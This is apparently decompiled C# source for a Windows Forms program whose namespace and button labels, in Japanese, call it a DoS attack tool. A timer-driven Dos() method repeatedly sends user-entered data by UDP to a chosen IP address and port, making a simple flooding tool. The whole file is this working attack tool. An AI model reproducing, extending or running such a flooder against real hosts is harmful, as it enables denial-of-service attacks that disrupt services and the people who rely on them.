using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace Dos攻撃ツ\u30FCル_II
{
	// Token: 0x02000002 RID: 2
	public partial class Form1 : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002068 File Offset: 0x00000268
		private void label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000003 RID: 3 RVA: 0x0000206B File Offset: 0x0000026B
		private void textBox3_TextChanged(object sender, EventArgs e)
		{
			this.datatxt.ScrollBars = ScrollBars.Vertical;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x0000207C File Offset: 0x0000027C
		private void button1_Click(object sender, EventArgs e)
		{
			this.running = this.label4.Text;
			bool flag = this.running.Contains("実行中");
			if (flag)
			{
				this.timer1.Stop();
				this.label4.Text = "停止中";
				this.button1.Text = "攻撃開始";
			}
			else
			{
				this.timer1.Start();
				this.label4.Text = "実行中";
				this.button1.Text = "攻撃停止";
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002111 File Offset: 0x00000311
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.Dos();
		}

		// Token: 0x06000006 RID: 6 RVA: 0x0000211C File Offset: 0x0000031C
		public void Dos()
		{
			UdpClient udpClient = new UdpClient();
			IPAddress ipaddress = IPAddress.Parse(this.iptxt.Text);
			int num = Convert.ToInt32(this.porttxt.Text);
			try
			{
				udpClient.Connect(ipaddress, num);
				byte[] bytes = Encoding.ASCII.GetBytes(this.datatxt.Text);
				udpClient.Send(bytes, bytes.Length);
				udpClient.AllowNatTraversal(true);
				udpClient.DontFragment = true;
			}
			catch
			{
				MessageBox.Show("");
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000021B0 File Offset: 0x000003B0
		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			string text = "https://jun-suzu.net";
			this.OpenUrl(text);
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000021CC File Offset: 0x000003CC
		private Process OpenUrl(string url)
		{
			return Process.Start(url);
		}

		// Token: 0x04000001 RID: 1
		private string running;
	}
}
